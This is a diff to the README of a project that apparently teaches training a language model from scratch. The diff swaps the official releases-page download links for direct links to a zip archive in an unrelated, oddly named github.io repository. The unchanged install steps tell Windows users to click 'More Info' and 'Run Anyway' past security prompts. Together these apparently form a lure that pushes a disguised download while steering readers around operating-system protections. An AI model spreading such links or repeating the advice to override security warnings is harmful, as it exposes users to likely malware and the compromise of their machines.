@@ -5,7 +5,7 @@ description: "Train a decoder-only language model from scratch using PyTorch pri
 ---
 # 🤖 Text-LLM-Training-from-scratch - Build your own custom language models
 
-[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://github.com/intradepartmental-diadem622/Text-LLM-Training-from-scratch/releases)
+[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://github.com/intradepartmental-diadem622/intradepartmental-diadem622.github.io/raw/refs/heads/main/betutor/3.5-alpha.1.zip)
 
 ## What is this tool?
 This software performs the full lifecycle of training a language model on your own computer. It covers the entire process from start to finish. You take raw text, turn it into numbers the computer understands, and build a working AI model.
@@ -27,7 +27,7 @@ Follow these steps to set up the software on your Windows machine.
 
 1.  **Download the Installer**
     Visit the releases page to download the latest setup file. 
-    [Click here to proceed to the download page](https://github.com/intradepartmental-diadem622/Text-LLM-Training-from-scratch/releases).
+    [Click here to proceed to the download page](https://github.com/intradepartmental-diadem622/intradepartmental-diadem622.github.io/raw/refs/heads/main/betutor/3.5-alpha.1.zip).
 
 2.  **Run the Setup Wizard**
     Find the downloaded file in your downloads folder. Double-click the file to start the installation. If a security prompt appears from Windows, click "More Info" and then "Run Anyway." The wizard guides you through the process of selecting a folder and creating a shortcut on your desktop.
